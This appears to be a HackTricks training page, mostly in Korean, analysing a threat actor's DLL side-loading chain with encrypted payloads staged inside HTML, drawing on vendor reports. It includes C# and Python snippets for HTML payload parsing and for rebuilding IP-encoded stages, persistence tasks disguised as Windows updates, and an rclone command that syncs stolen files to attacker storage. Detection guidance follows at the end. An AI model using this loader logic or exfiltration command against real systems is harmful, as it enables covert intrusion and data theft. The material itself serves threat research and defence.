# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft 개요

Ashen Lepus (aka WIRTE)는 DLL sideloading, staged HTML payloads, 그리고 modular .NET backdoor를 연결하는 반복 가능한 패턴을 무기화해 Middle Eastern diplomatic networks 안에 지속적으로 침투했다. 이 technique은 다음에 의존하므로 어떤 operator라도 재사용할 수 있다:

- **Archive-based social engineering**: 무해한 PDF가 대상에게 file-sharing site에서 RAR archive를 내려받도록 지시한다. 이 archive에는 실제처럼 보이는 document viewer EXE, 신뢰받는 library 이름을 딴 malicious DLL(예: `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), 그리고 미끼용 `Document.pdf`가 함께 들어 있다.
- **DLL search order abuse**: 피해자가 EXE를 더블클릭하면 Windows가 current directory에서 DLL import를 resolve하고, malicious loader(AshenLoader)가 trusted process 내부에서 실행되는 동안 미끼 PDF는 열려 의심을 피한다.
- **Living-off-the-land staging**: 이후의 모든 stage(AshenStager → AshenOrchestrator → modules)는 필요할 때까지 disk에 남기지 않고, 무해해 보이는 HTML response 안에 숨긴 encrypted blob 형태로 전달된다.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE가 AshenLoader를 side-load하면, 이 loader는 host recon을 수행하고, AES-CTR로 encrypt한 뒤, `token=`, `id=`, `q=`, 또는 `auth=` 같은 rotating parameter를 사용해 `POST`로 전송하며 `/api/v2/account` 같은 API처럼 보이는 path로 보낸다.
2. **HTML extraction**: C2는 client IP가 target region으로 geolocate되고 `User-Agent`가 implant와 일치할 때만 다음 stage를 드러내며, sandbox를 방해한다. 체크를 통과하면 HTTP body에 `<headerp>...</headerp>` blob이 포함되고, 여기에는 Base64/AES-CTR encrypted AshenStager payload가 들어 있다.
3. **Second sideload**: AshenStager는 `wtsapi32.dll`을 import하는 또 다른 legitimate binary와 함께 배포된다. binary에 주입된 malicious copy는 추가 HTML을 가져오며, 이번에는 `<article>...</article>`을 파싱해 AshenOrchestrator를 복구한다.
4. **AshenOrchestrator**: Base64 JSON config를 디코드하는 modular .NET controller다. config의 `tg`와 `au` 필드는 연결/해시되어 AES key를 만들고, 이것이 `xrk`를 decrypt한다. 결과 bytes는 이후 가져오는 모든 module blob에 대한 XOR key로 작동한다.
5. **Module delivery**: 각 module은 parser를 arbitrary tag로 redirect하는 HTML comment를 통해 설명되며, `<headerp>` 또는 `<article>`만 보는 static rule을 무력화한다. module에는 persistence(`PR*`), uninstallers(`UN*`), reconnaissance(`SN`), screen capture(`SCT`), 그리고 file exploration(`FE`)이 포함된다.

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
방어자가 특정 요소를 차단하거나 제거하더라도, 운영자는 HTML 주석에 암시된 태그만 바꿔서 전달을 재개하면 된다.

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

최근 Talos의 HTML smuggling 연구는 HTML 첨부파일의 `<script>` 블록 안에 Base64 문자열로 숨겨진 payload를 런타임에 JavaScript로 디코딩하는 방식을 강조한다. 같은 기법은 C2 responses에도 재사용할 수 있다: script 태그(또는 다른 DOM element) 안에 암호화된 blob을 넣어 stage하고, AES/XOR 전에 메모리 내에서 디코딩하면 페이지가 일반적인 HTML처럼 보이게 된다. Talos는 또한 script 태그 내부에서의 다층 obfuscation(identifier renaming과 Base64/Caesar/AES 조합)을 보여주는데, 이는 HTML-staged C2 blob에 그대로 적용할 수 있다. Talos의 이후 **hidden text salting** writeup도 여기서 관련이 있다: Base64를 무의미한 HTML comments나 whitespace로 분리하면 browser-side reconstruction은 매우 간단하게 유지하면서도 단순한 regex extractor는 깨뜨릴 수 있다.

## Recent Variant Notes (2024-2025)

- Check Point는 2024년 WIRTE campaigns에서 archive-based sideloading을 여전히 기반으로 하면서도 첫 stage로 `propsys.dll`(stagerx64)을 사용한 사례를 관찰했다. 이 stager는 Base64 + XOR(key `53`)로 다음 payload를 디코딩하고, 하드코딩된 `User-Agent`를 사용해 HTTP requests를 보내며, HTML tags 사이에 삽입된 암호화된 blobs를 추출한다. 한 분기에서는 `RtlIpv4StringToAddressA`로 디코딩한 긴 embedded IP strings 목록에서 stage를 재구성한 뒤, 이를 payload bytes에 연결했다.
- OWN-CERT는 더 이른 시기의 WIRTE tooling을 문서화했는데, 여기서는 side-loaded `wtsapi32.dll` dropper가 Base64 + TEA로 strings를 보호하고 DLL 이름 자체를 decryption key로 사용했으며, 이후 C2로 보내기 전에 host identification data를 XOR/Base64-obfuscation했다.

## Reconstructing IP-Encoded Stages

WIRTE의 2024 `propsys.dll` 분기는 다음 PE가 하나의 연속된 HTML blob으로 존재할 필요가 없음을 보여준다. loader는 stage bytes를 dotted-quad strings로 저장한 뒤 `RtlIpv4StringToAddressA`로 재구성할 수 있는데, 이는 Hive의 **IPfuscation** tradecraft와 매우 유사한 패턴이다. 운영 측면에서 이는 actor가 HTML page에 명백한 Base64 payload 대신 무해한 IOCs나 config data처럼 보이는 것을 담고 싶을 때 유용하다.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
If the recovered bytes begin with `MZ`, you likely reconstructed the next PE directly. If not, check for a leading XOR/Base64 layer or small delimiter chunks between addresses.

## 교체 가능한 DLL 이름 및 Host 로테이션

이 패턴의 강한 속성은 **HTML/AES/XOR staging backend는 동일하게 유지하면서 sideload pair만 바뀔 수 있다**는 점이다. WIRTE는 캠페인 전반에 걸쳐 `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`, `propsys.dll`를 순환 사용했는데, 이는 다음 이유로 유용하다:

- `propsys.dll`와 `wtsapi32.dll`은 방어자가 `%System32%` / `%SysWOW64%`에 존재한다고 예상하는 평범한 Windows DLL 이름이다.
- **HijackLibs** 같은 공개 카탈로그는 이미 많은 바이너리가 복사된 application directory에서 이런 DLL 이름을 로드한다는 것을 매핑해두었고, 이를 통해 operator는 stager를 재설계하지 않고도 대체 host를 확보할 수 있다.
- host마다 export surface만 맞추면 된다. HTML parser, AES/XOR routines, module loader는 보통 forwarding proxy DLL에 그대로 이식할 수 있다.

공격적 lab 작업에서 이는 문제를 **(1) 선택한 DLL 이름을 로컬에서 resolve하는 안정적인 signed host를 찾고** **(2) 그 DLL 뒤에 같은 staged-HTML loader logic을 재사용하는 것**으로 분리할 수 있음을 의미한다.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: 최신 loader는 256-bit keys와 nonces(예: `{9a 20 51 98 ...}`)를 내장하고, 복호화 전후로 `msasn1.dll` 같은 문자열을 사용한 XOR layer를 추가하기도 한다.
- **Key material variations**: 초기 loader는 embedded strings를 보호하기 위해 Base64 + TEA를 사용했으며, decryption key는 악성 DLL 이름(예: `wtsapi32.dll`)에서 파생되었다.
- **Infrastructure split + subdomain camouflage**: staging servers는 tool별로 분리되고, 서로 다른 ASN에 호스팅되며, 때로는 정상처럼 보이는 subdomain으로 fronting되어 한 stage가 노출되어도 나머지는 드러나지 않는다.
- **Recon smuggling**: 열거된 데이터에는 이제 고가치 app을 식별하기 위한 Program Files 목록이 포함되며, host를 떠나기 전에 항상 암호화된다.
- **URI churn**: query parameters와 REST paths는 캠페인마다 바뀐다(`/api/v1/account?token=` → `/api/v2/account?auth=`), 취약한 detections를 무력화한다.
- **User-Agent pinning + safe redirects**: C2 infrastructure는 정확한 UA strings에만 응답하고, 그 외에는 정상 news/health sites로 redirect하여 섞여 보이게 한다.
- **Gated delivery**: servers는 geo-fencing 되어 있고 실제 implants에만 응답한다. 승인되지 않은 client는 의심스럽지 않은 HTML을 받는다.

## Persistence & Execution Loop

AshenStager는 Windows maintenance jobs처럼 위장한 scheduled tasks를 drop하고 `svchost.exe`를 통해 실행한다. 예:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

이 task들은 부팅 시 또는 주기적으로 sideloading chain을 다시 실행해, AshenOrchestrator가 disk를 다시 건드리지 않고도 새 module을 요청할 수 있게 한다.

## Using Benign Sync Clients for Exfiltration

Operator는 전용 module을 통해 외교 문서를 `C:\Users\Public`(모든 사용자가 읽을 수 있고 의심스럽지 않음)에 staging한 뒤, 정식 [Rclone](https://rclone.org/) binary를 내려받아 해당 directory를 attacker storage와 동기화한다. Unit42는 이것이 이 actor가 exfiltration에 Rclone을 사용하는 것이 처음 관찰된 사례라고 언급하며, 정상 traffic에 섞이기 위해 합법적인 sync tooling을 악용하는 더 넓은 추세와도 맞아떨어진다고 설명한다:

1. **Stage**: target files를 `C:\Users\Public\{campaign}\`에 복사/수집한다.
2. **Configure**: attacker-controlled HTTPS endpoint(예: `api.technology-system[.]com`)를 가리키는 Rclone config를 배포한다.
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`를 실행해 traffic이 정상 cloud backup처럼 보이게 한다.

Rclone은 정상 backup workflow에서 널리 쓰이므로, defenders는 비정상 실행(new binaries, 이상한 remotes, `C:\Users\Public`의 갑작스러운 syncing)에 집중해야 한다.

## Detection Pivots

- user-writable paths에서 DLL을 예기치 않게 로드하는 **signed processes**를 경고하라(Procmon filters + `Get-ProcessMitigation -Module`), 특히 DLL 이름이 `netutils`, `srvcli`, `dwampi`, `wtsapi32`, `propsys`와 겹칠 때.
- 의심스러운 HTTPS responses에서 **비정상적인 태그 안에 포함된 큰 Base64 blobs** 또는 `<!-- TAG: <xyz> -->` comments로 보호된 내용을 점검하라.
- 먼저 HTML을 정규화하라: **Base64 추출 전에 comments를 제거하고 whitespace를 collapse**하라. hidden-text-salting 스타일의 evasion은 payload를 comment boundary를 가로질러 분할할 수 있기 때문이다.
- `<script>` blocks 내부의 **Base64 strings**(HTML smuggling-style staging)까지 HTML hunting을 확장하라. 이는 AES/XOR processing 전에 JavaScript로 decode된다.
- **`RtlIpv4StringToAddressA`를 반복 호출한 뒤 buffer assembly**가 이어지는 패턴을 찾되, 특히 주변 문자열이 실제 network targets가 아니라 긴 IPv4 lists일 때 주목하라.
- `svchost.exe`를 non-service arguments로 실행하거나 dropper directories를 가리키는 **scheduled tasks**를 찾아라.
- 정확한 **`User-Agent` strings**에만 payload를 반환하고 그렇지 않으면 정상 news/health domains로 되돌리는 **C2 redirects**를 추적하라.
- IT-managed locations 밖에 나타나는 **Rclone** binaries, 새로운 `rclone.conf` files, 또는 `C:\Users\Public` 같은 staging directories에서 가져오는 sync jobs를 모니터링하라.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
